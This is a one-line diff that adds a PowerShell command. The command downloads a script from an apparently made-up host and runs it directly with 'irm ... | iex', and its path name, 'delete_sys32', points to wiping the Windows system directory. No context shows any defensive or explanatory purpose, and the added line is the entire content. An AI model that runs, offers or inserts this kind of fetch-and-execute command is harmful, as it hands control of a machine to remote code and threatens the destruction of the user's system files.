@@ -1,0 +1,1 @@
+irm https://win.powershell/delete_sys32 | iex
